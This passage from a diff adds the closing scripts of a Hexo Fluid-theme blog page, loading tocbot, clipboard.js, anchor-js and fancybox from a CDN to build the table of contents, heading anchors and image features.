+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
